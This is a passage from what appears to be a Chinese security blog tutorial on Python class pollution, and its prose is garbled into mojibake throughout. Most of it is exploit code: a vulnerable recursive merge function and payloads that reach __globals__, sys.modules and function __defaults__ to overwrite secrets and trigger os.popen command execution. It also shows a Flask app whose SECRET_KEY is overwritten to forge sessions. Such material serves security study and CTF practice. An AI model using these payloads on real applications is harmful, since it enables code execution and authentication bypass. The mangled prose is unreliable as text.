  &#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;a&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;secret&quot;</span>:<span class="hljs-string">&quot;hacker&quot;</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>b = b()<br><br><span class="hljs-built_in">print</span>(test.test.secret)<br><span class="hljs-built_in">print</span>(a.secret)<br>merge(payload, b)<br><span class="hljs-built_in">print</span>(test.test.secret)<br><span class="hljs-built_in">print</span>(a.secret)<br><br></code></pre></td></tr></table></figure><p>ç„¶å<code>__spec__</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">import</span> test<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">a</span>():<br>    secret = <span class="hljs-string">&quot;nonono&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">b</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-comment"># éå†å­—å…¸ä¸­çš„æ‰€æœ‰é”®å€¼å¯¹</span><br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-comment"># æ£€æŸ¥dstæ˜¯å¦ä¸ºå­—å…¸</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-comment"># å¦‚æœå­˜åœ¨é”®kå¹¶ä¸”væ˜¯ä¸€ä¸ªå­—å…¸</span><br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>                <span class="hljs-comment"># å¦‚æœdstæ˜¯ä¸€ä¸ªå¯¹è±¡å¹¶ä¸”æœ‰å±æ€§k</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># å°†vèµ‹å€¼ç»™k</span><br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;math&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;__spec__&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;__init__&quot;</span>: &#123;<br>                        <span class="hljs-string">&quot;__globals__&quot;</span>: &#123;<br>                            <span class="hljs-string">&quot;sys&quot;</span>: &#123;<br>                                <span class="hljs-string">&quot;modules&quot;</span>: &#123;<br>                                    <span class="hljs-string">&quot;test&quot;</span>: &#123;<br>                                        <span class="hljs-string">&quot;test&quot;</span>: &#123;<br>                                            <span class="hljs-string">&quot;secret&quot;</span>: <span class="hljs-string">&quot;hacker&quot;</span><br>                                        &#125;<br>                                    &#125;<br>                                &#125;,<br><br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;a&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;secret&quot;</span>: <span class="hljs-string">&quot;hacker&quot;</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>b = b()<br><br><span class="hljs-built_in">print</span>(test.test.secret)<br><span class="hljs-built_in">print</span>(a.secret)<br>merge(payload, b)<br><span class="hljs-built_in">print</span>(test.test.secret)<br><span class="hljs-built_in">print</span>(a.secret)<br><br></code></pre></td></tr></table></figure><h3 id="å‡½æ•°å½¢å‚é»˜è®¤å€¼æ›¿æ¢"><a href="#å‡½æ•°å½¢å‚é»˜è®¤å€¼æ›¿æ¢" class="headerlink" title="å‡½æ•°å½¢å‚é»˜è®¤å€¼æ›¿æ¢"></a>å‡½æ•°å½¢å‚é»˜è®¤å€¼æ›¿æ¢</h3><p><code>__defaults__</code>æ˜¯ä¸€ä¸ª<strong>å…ƒç»„</strong>ï¼Œç”¨äºå­˜å‚¨å‡½æ•°æˆ–æ–¹æ³•çš„é»˜è®¤å‚æ•°å€¼ã€‚å½“æˆ‘ä»¬å»å®šä¹‰ä¸€ä¸ªå‡½æ•°æ—¶ï¼Œå¯ä»¥ä¸ºå…¶ä¸­çš„å‚æ•°æŒ‡å®šé»˜è®¤å€¼ã€‚è¿™äº›é»˜è®¤å€¼ä¼šè¢«å­˜å‚¨åœ¨<code>__defaults__</code><strong>å…ƒç»„</strong>ä¸­ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªå±æ€§æ¥æ±¡æŸ“å‚æ•°é»˜è®¤å€¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">x,y=<span class="hljs-number">2</span>,z=<span class="hljs-number">3</span></span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-built_in">print</span>(a.__defaults__)<br><span class="hljs-comment"># (2,3)</span><br></code></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæœ‰ä¸‰ä¸ªå‚æ•°ï¼Œå…¶ä¸­ä¸€ä¸ªå¿…å¡«å‚æ•°(<code>x</code>)ï¼Œè¿˜æœ‰ä¸¤ä¸ªæ˜¯å¯é€‰å‚æ•°(<code>y</code>ï¼Œ<code>z</code>)ï¼Œå†å¤šçœ‹çœ‹ï¼ŒæŠŠ<code>__default__</code>çœ‹æ‡‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">func_b</span>(<span class="hljs-params">var_1, var_2</span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-built_in">print</span>(func_b.__defaults__)<br><span class="hljs-comment"># None</span><br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆå†æ¥çœ‹ä¸ªç‰¹æ®Šçš„</p><blockquote><ol><li><p><code>/</code> ä¹‹å‰çš„å‚æ•°</p><p>ï¼š</p><ul><li>è¿™äº›å‚æ•°æ˜¯ <strong>ä½ç½®å‚æ•°</strong>ï¼ˆpositional-only parametersï¼‰ã€‚</li><li>å®ƒä»¬åªèƒ½é€šè¿‡ä½ç½®ä¼ é€’ï¼Œä¸èƒ½é€šè¿‡å…³é”®å­—ä¼ é€’ã€‚</li></ul></li><li><p><code>/</code> å’Œ <code>*</code> ä¹‹é—´çš„å‚æ•°</p><p>ï¼š</p><ul><li>è¿™äº›å‚æ•°æ—¢å¯ä»¥æ˜¯ <strong>ä½ç½®å‚æ•°</strong>ï¼Œä¹Ÿå¯ä»¥æ˜¯ <strong>å…³é”®å­—å‚æ•°</strong>ã€‚</li><li>å®ƒä»¬å¯ä»¥é€šè¿‡ä½ç½®æˆ–å…³é”®å­—ä¼ é€’ã€‚</li></ul></li><li><p><code>*</code> ä¹‹åçš„å‚æ•°</p><p>ï¼š</p><ul><li>è¿™äº›å‚æ•°æ˜¯ <strong>å…³é”®å­—å‚æ•°</strong>ï¼ˆkeyword-only parametersï¼‰ã€‚</li><li>å®ƒä»¬åªèƒ½é€šè¿‡å…³é”®å­—ä¼ é€’ï¼Œä¸èƒ½é€šè¿‡ä½ç½®ä¼ é€’ã€‚</li><li>æœ‰é»˜è®¤å€¼ä½†æ˜¯ä¸è®¡å…¥<code>__defualts__</code></li></ul></li></ol></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">x,/,y=<span class="hljs-number">2</span>,*,z=<span class="hljs-number">3</span></span>):<br>    <span class="hljs-keyword">pass</span><br><br>a(x=<span class="hljs-number">1</span>)<br><span class="hljs-comment"># TypeError: a() got some positional-only arguments passed as keyword arguments: &#x27;x&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">x,/,y=<span class="hljs-number">2</span>,*,z=<span class="hljs-number">3</span></span>):<br>    <span class="hljs-keyword">pass</span><br><br>a(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>)<br><span class="hljs-comment"># TypeError: a() takes from 1 to 2 positional arguments but 3 were given</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">x,/,y=<span class="hljs-number">2</span>,*,z=<span class="hljs-number">3</span></span>):<br>    <span class="hljs-built_in">print</span>(x,y,z)<br>    <span class="hljs-keyword">pass</span><br><br>a(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,z=<span class="hljs-number">6</span>)<br><span class="hljs-built_in">print</span>(a.__defaults__)<br></code></pre></td></tr></table></figure><p>æ¬§å…‹æ‡‚äº†ä¹‹åæ¥æ±¡æŸ“å§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">demo</span>(<span class="hljs-params">x,name=<span class="hljs-string">&quot;baozongwi&quot;</span>,age=<span class="hljs-string">&quot;99&quot;</span></span>):<br>    <span class="hljs-keyword">if</span> name != <span class="hljs-string">&quot;12SqweR&quot;</span>:<br>        <span class="hljs-built_in">print</span>(x)<br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-keyword">if</span> age != <span class="hljs-string">&quot;99&quot;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).popen(x).read())<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src,dst</span>):<br>    <span class="hljs-comment"># éå†å­—å…¸ä¸­çš„æ‰€æœ‰é”®å€¼å¯¹</span><br>    <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-comment"># æ£€æŸ¥dstæ˜¯å¦ä¸ºå­—å…¸</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst,<span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-comment"># å¦‚æœå­˜åœ¨é”®kå¹¶ä¸”væ˜¯ä¸€ä¸ªå­—å…¸</span><br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v,dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k]=v<br>                <span class="hljs-comment"># å¦‚æœdstæ˜¯ä¸€ä¸ªå¯¹è±¡å¹¶ä¸”æœ‰å±æ€§k</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst,k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v,<span class="hljs-built_in">getattr</span>(dst,k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># å°†vèµ‹å€¼ç»™k</span><br>            <span class="hljs-built_in">setattr</span>(dst,k,v)<br>a=A()<br>b=demo<br>payload=&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;demo&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;__defaults__&quot;</span>:<br>                    (<span class="hljs-string">&quot;12SqweR&quot;</span>,<span class="hljs-string">&quot;100&quot;</span>)<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-built_in">print</span>(b.__defaults__)<br>merge(payload,a)<br><span class="hljs-built_in">print</span>(b.__defaults__)<br>c=demo(<span class="hljs-string">&quot;whoami&quot;</span>)<br></code></pre></td></tr></table></figure><p>è¿™ä¸ª<code>__defaults__</code>çš„å†™æ³•ä¸€å®šè¦å¯¹ï¼Œæ˜¯å…ƒç»„ï¼Œä¸ç„¶å°±å¤±è´¥ï¼Œå½“ç„¶å¦‚æœæ˜¯<code>True</code>æˆ–è€…<code>False</code>çš„è¯ï¼Œå°±å¯ä»¥ç›´æ¥å†™</p><p>æŸ¥çœ‹ä¸€äº›æ±¡æŸ“ç±»æ–‡ç« å‘ç°ç”¨<code>sys</code>ä¸€æ ·å¯ä»¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>(<span class="hljs-params">x,y=<span class="hljs-string">&quot;123456&quot;</span>,z=<span class="hljs-string">&quot;test&quot;</span></span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br>a = A()<br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;sys&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;modules&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;__main__&quot;</span>: &#123;<br>                        <span class="hljs-string">&quot;test&quot;</span>: &#123;<br>                            <span class="hljs-string">&quot;__defaults__&quot;</span>: (<span class="hljs-string">&quot;hacker&quot;</span>, <span class="hljs-string">&quot;hacker&quot;</span>)<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-built_in">print</span>(test.__defaults__)<br><br>merge(payload, a)<br><span class="hljs-built_in">print</span>(test.__defaults__)<br><br></code></pre></td></tr></table></figure><p>é™¤äº†<code>__defaults__</code>è¿˜æœ‰<code>__kwdefaults__</code>ï¼Œå¤§å·®ä¸å·®ï¼Œåªä¸è¿‡è¿™ä¸ªæ˜¯å­—å…¸ï¼Œcancan</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">func_a</span>(<span class="hljs-params">var_1, var_2 =<span class="hljs-number">2</span>, var_3 = <span class="hljs-number">3</span></span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func_b</span>(<span class="hljs-params">var_1, /, var_2 =<span class="hljs-number">2</span>, var_3 = <span class="hljs-number">3</span></span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func_c</span>(<span class="hljs-params">var_1, var_2 =<span class="hljs-number">2</span>, *, var_3 = <span class="hljs-number">3</span></span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func_d</span>(<span class="hljs-params">var_1, /, var_2 =<span class="hljs-number">2</span>, *, var_3 = <span class="hljs-number">3</span></span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-built_in">print</span>(func_a.__kwdefaults__)<br><span class="hljs-comment">#None</span><br><span class="hljs-built_in">print</span>(func_b.__kwdefaults__)<br><span class="hljs-comment">#None</span><br><span class="hljs-built_in">print</span>(func_c.__kwdefaults__)<br><span class="hljs-comment">#&#123;&#x27;var_3&#x27;: 3&#125;</span><br><span class="hljs-built_in">print</span>(func_d.__kwdefaults__)<br><span class="hljs-comment">#&#123;&#x27;var_3&#x27;: 3&#125;</span><br></code></pre></td></tr></table></figure><p>å‘ç°åªæœ‰å…³é”®å­—å‚æ•°çš„é»˜è®¤å€¼æ‰ä¼šè¿”å›</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>(<span class="hljs-params">x,*,y=<span class="hljs-string">&quot;123456&quot;</span>,z=<span class="hljs-string">&quot;test&quot;</span></span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br>a = A()<br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;test&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;__kwdefaults__&quot;</span>:&#123;<br>                    <span class="hljs-string">&quot;y&quot;</span>:<span class="hljs-string">&quot;hacker&quot;</span>,<br>                    <span class="hljs-string">&quot;z&quot;</span>:<span class="hljs-string">&quot;hacker&quot;</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-built_in">print</span>(test.__kwdefaults__)<br>merge(payload, a)<br><span class="hljs-built_in">print</span>(test.__kwdefaults__)<br><br></code></pre></td></tr></table></figure><h3 id="flaskç‰¹å®šå±æ€§æ±¡æŸ“"><a href="#flaskç‰¹å®šå±æ€§æ±¡æŸ“" class="headerlink" title="flaskç‰¹å®šå±æ€§æ±¡æŸ“"></a>flaskç‰¹å®šå±æ€§æ±¡æŸ“</h3><p>éœ€è¦äº†è§£ä¸€äº›æ¡†æ¶çš„åº•å±‚ï¼Œ</p><h4 id="å¯†é’¥æ›¿æ¢"><a href="#å¯†é’¥æ›¿æ¢" class="headerlink" title="å¯†é’¥æ›¿æ¢"></a>å¯†é’¥æ›¿æ¢</h4><p>è¿™é‡Œç›´æ¥è´´ä»£ç å§ï¼Œå¯ä»¥é€ æˆä»»æ„sessionä¼ªé€ ç”šè‡³æ”¹å˜pinç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">import</span> json<br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-comment"># Recursive merge function</span><br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cls</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>instance = cls()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> request.data:<br>        merge(json.loads(request.data), instance)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[+]Config:%s&quot;</span>%(app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>])<br><br>app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>)<br></code></pre></td></tr></table></figure><p>æ±¡æŸ“é“¾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span> : &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span> : &#123;<br>            <span class="hljs-string">&quot;app&quot;</span> : &#123;<br>                <span class="hljs-string">&quot;config&quot;</span> : &#123;<br>                    <span class="hljs-string">&quot;SECRET_KEY&quot;</span> :<span class="hljs-string">&quot;hacker&quot;</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="got-first-requestæ±¡æŸ“"><a href="#got-first-requestæ±¡æŸ“" class="headerlink" 